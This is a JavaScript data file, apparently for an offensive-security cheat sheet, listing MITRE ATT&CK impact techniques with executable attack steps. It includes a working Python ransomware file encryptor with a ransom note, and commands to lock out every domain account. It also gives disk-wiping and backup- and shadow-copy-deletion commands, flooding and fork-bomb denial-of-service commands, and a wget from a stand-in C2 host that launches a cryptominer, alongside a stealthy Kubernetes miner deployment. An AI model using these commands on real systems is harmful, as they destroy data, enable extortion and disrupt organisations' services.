export const impactTechniques = [
  {
    id: "T1531",
    name: "Account Access Removal",
    summary: "lock out accounts • disable users • ransom leverage",
    description: "Removing, disabling, or denying access to accounts to create disruption, prevent recovery, or leverage for extortion.",
    tags: ["T1531", "account lockout", "disable accounts", "disruption"],
    steps: [
      { type: "comment", content: "# Disable all domain user accounts except own" },
      { type: "cmd", content: "Get-ADUser -Filter {Enabled -eq $true} | Where-Object {$_.SamAccountName -ne 'attacker'} | Disable-ADAccount" },
      { type: "comment", content: "# Reset passwords of admin accounts before ransom demand" },
      { type: "cmd", content: "Get-ADGroupMember 'Domain Admins' | Set-ADAccountPassword -NewPassword (ConvertTo-SecureString 'LockedByAttacker!' -AsPlainText -Force)" },
      { type: "comment", content: "# Linux: lock all users" },
      { type: "cmd", content: "for user in $(getent passwd | awk -F: '$3 >= 1000 {print $1}'); do usermod -L $user; done" },
    ]
  },
  {
    id: "T1485",
    name: "Data Destruction",
    summary: "rm -rf • format • wipe • ransomware",
    description: "Destroying data on victim systems to render it permanently unavailable, often as a disruptive or extortive attack.",
    tags: ["T1485", "data destruction", "wipe", "rm -rf", "format"],
    steps: [
      { type: "comment", content: "# Securely wipe data on Linux" },
      { type: "cmd", content: "shred -n 3 -z /dev/sda  # Overwrite disk 3 times\nfind /data -type f -exec shred -n 3 -z {} \\;" },
      { type: "comment", content: "# Windows: format drives" },
      { type: "cmd", content: "format C: /q /fs:NTFS /y  # Quick format\ndiskpart  # Use to clean/wipe drives" },
      { type: "comment", content: "# Destroy backups first (critical for ransomware success)" },
      { type: "cmd", content: "vssadmin delete shadows /all /quiet  # Delete VSS shadow copies\nwbadmin delete catalog -quiet  # Delete Windows backup catalog\nbcdedit /set {default} recoveryenabled no" },
    ]
  },
  {
    id: "T1486",
    name: "Data Encrypted for Impact",
    summary: "ransomware • file encryption • extortion",
    description: "Encrypting victim data to deny access and extort payment for decryption keys.",
    tags: ["T1486", "ransomware", "encryption", "extortion"],
    steps: [
      { type: "comment", content: "# Pre-ransomware checklist" },
      { type: "text", content: "Before encryption: exfiltrate data for double extortion, disable AV/EDR, delete backups/shadow copies, disable recovery options." },
      { type: "comment", content: "# Simple Python file encryptor (for demonstration)" },
      { type: "code", content: "from Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nimport os, glob\n\nKEY = get_random_bytes(32)  # Send to C2 before encrypting!\nEXTS = ['.docx','.xlsx','.pdf','.jpg','.png','.pptx','.sql','.bak']\n\nfor ext in EXTS:\n    for f in glob.glob(f'C:\\\\Users\\\\**\\\\*{ext}', recursive=True):\n        with open(f, 'rb') as fp: data = fp.read()\n        cipher = AES.new(KEY, AES.MODE_GCM)\n        ct, tag = cipher.encrypt_and_digest(data)\n        with open(f + '.locked', 'wb') as fp:\n            fp.write(cipher.nonce + tag + ct)\n        os.remove(f)" },
      { type: "comment", content: "# Drop ransom note" },
      { type: "cmd", content: "echo 'YOUR FILES ARE ENCRYPTED. Contact attacker@proton.me' > C:\\Users\\Public\\Desktop\\README_RANSOM.txt" },
    ]
  },
  {
    id: "T1491",
    name: "Defacement",
    summary: "web defacement • internal system message",
    description: "Modifying visual content of websites or internal systems to send a message, embarrass the organization, or claim attack.",
    tags: ["T1491", "defacement", "web defacement", "visual impact"],
    steps: [
      { type: "comment", content: "# T1491.001 - Deface internal systems for maximum impact" },
      { type: "cmd", content: "# Replace desktop wallpaper on all domain computers via GPO:\n# Set GPO: User Configuration > Policies > Administrative Templates > Desktop > Desktop Wallpaper\n# Point to network share with defacement image" },
      { type: "comment", content: "# T1491.002 - External website defacement" },
      { type: "cmd", content: "# After gaining web shell access:\ncurl -X PUT -d @defacement.html https://target.com/index.html\necho '<h1>HACKED</h1>' > /var/www/html/index.html" },
    ]
  },
  {
    id: "T1498",
    name: "Network Denial of Service",
    summary: "DDoS • volumetric • amplification • HTTP flood",
    description: "Performing denial of service attacks against network infrastructure to disrupt availability.",
    tags: ["T1498", "DDoS", "volumetric", "amplification", "HTTP flood"],
    steps: [
      { type: "comment", content: "# T1498.001 - SYN flood with hping3" },
      { type: "cmd", content: "hping3 --flood --rand-source --syn -p 80 target.com" },
      { type: "comment", content: "# T1498.002 - Amplification attack via memcached" },
      { type: "cmd", content: "# Send requests with spoofed source IP (victim) to memcached servers\n# Amplification factor ~50000x" },
      { type: "comment", content: "# HTTP flood" },
      { type: "cmd", content: "slowhttptest -c 1000 -H -g -o results -i 10 -r 200 -t GET -u https://target.com -x 24 -p 3" },
    ]
  },
  {
    id: "T1499",
    name: "Endpoint Denial of Service",
    summary: "system crash • resource exhaustion • fork bomb",
    description: "Degrading or denying access to services on individual endpoint systems through resource exhaustion or system crashes.",
    tags: ["T1499", "resource exhaustion", "fork bomb", "CPU/memory exhaustion"],
    steps: [
      { type: "comment", content: "# Fork bomb - exhaust process resources" },
      { type: "cmd", content: ":(){ :|:& };:  # Linux fork bomb (DO NOT RUN on production systems)" },
      { type: "comment", content: "# CPU exhaustion via infinite loop" },
      { type: "code", content: "# Python CPU exhaustion (all cores)\nimport multiprocessing\nfor _ in range(multiprocessing.cpu_count()):\n    multiprocessing.Process(target=lambda: [x**2 for x in range(10**9)]).start()" },
      { type: "comment", content: "# Fill disk to deny service" },
      { type: "cmd", content: "dd if=/dev/urandom of=/dev/sda bs=1M  # Overwrite disk\nfallocate -l $(df / | tail -1 | awk '{print $4}')K /tmp/fillfile  # Fill filesystem" },
    ]
  },
  {
    id: "T1496",
    name: "Resource Hijacking",
    summary: "cryptomining • compute hijacking • cost infliction",
    description: "Hijacking victim system resources to mine cryptocurrency or perform other computational tasks for attacker benefit.",
    tags: ["T1496", "cryptomining", "resource hijacking", "XMRig"],
    steps: [
      { type: "comment", content: "# Deploy XMRig cryptominer on compromised systems" },
      { type: "cmd", content: "wget http://c2.com/xmrig -O /tmp/.cache && chmod +x /tmp/.cache\n/tmp/.cache -o pool.supportxmr.com:443 -u YOUR_WALLET --cpu-max-threads-hint=50 --background" },
      { type: "comment", content: "# Deploy miner via Kubernetes to scale across cluster" },
      { type: "code", content: "# crypto-daemonset.yaml\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cache-sync\nspec:\n  selector:\n    matchLabels: {app: cache}\n  template:\n    spec:\n      containers:\n      - name: cache\n        image: attacker/xmrig-container:latest\n        resources:\n          limits: {cpu: '0.8'}  # Stay under monitoring threshold" },
    ]
  },
  {
    id: "T1490",
    name: "Inhibit System Recovery",
    summary: "delete shadow copies • disable backups • wipe recovery",
    description: "Deleting or modifying backups, shadow copies, and recovery mechanisms to prevent system restoration after an attack.",
    tags: ["T1490", "shadow copies", "VSS", "backup deletion", "recovery inhibit"],
    steps: [
      { type: "comment", content: "# Delete all VSS shadow copies (prevents file recovery)" },
      { type: "cmd", content: "vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\npowershell.exe -Command \"Get-WmiObject Win32_ShadowCopy | Remove-WmiObject\"" },
      { type: "comment", content: "# Disable Windows Recovery Environment" },
      { type: "cmd", content: "bcdedit /set {default} bootstatuspolicy ignoreallfailures\nbcdedit /set {default} recoveryenabled no\nwbadmin delete catalog -quiet" },
      { type: "comment", content: "# Delete backup files from network shares" },
      { type: "cmd", content: "# Find and delete common backup file extensions:\nGet-ChildItem -Recurse -Include *.bak,*.vbk,*.vib,*.vbm -Path \\\\backupserver\\ | Remove-Item -Force" },
    ]
  },
  {
    id: "T1489",
    name: "Service Stop",
    summary: "stop AV • stop backup • stop critical services",
    description: "Stopping or disabling critical services to disrupt operations, disable defenses, or prepare for destructive attacks.",
    tags: ["T1489", "service stop", "disable services", "disrupt"],
    steps: [
      { type: "comment", content: "# Stop and disable security and backup services" },
      { type: "cmd", content: "net stop \"Windows Defender Antivirus Service\" && sc config WinDefend start= disabled\nnet stop \"Backup Service\" && sc config wbengine start= disabled\nnet stop \"Volume Shadow Copy\" && sc config VSS start= disabled" },
      { type: "comment", content: "# Stop critical business services for maximum disruption" },
      { type: "cmd", content: "net stop MSSQLSERVER  # SQL Server\nnet stop W3SVC  # IIS Web Server\nnet stop NTDS  # Active Directory (requires reboot to take effect)" },
      { type: "comment", content: "# Linux: stop critical services" },
      { type: "cmd", content: "systemctl stop mysql postgresql nginx apache2 backup-agent\nsystemctl disable mysql postgresql nginx apache2" },
    ]
  },
];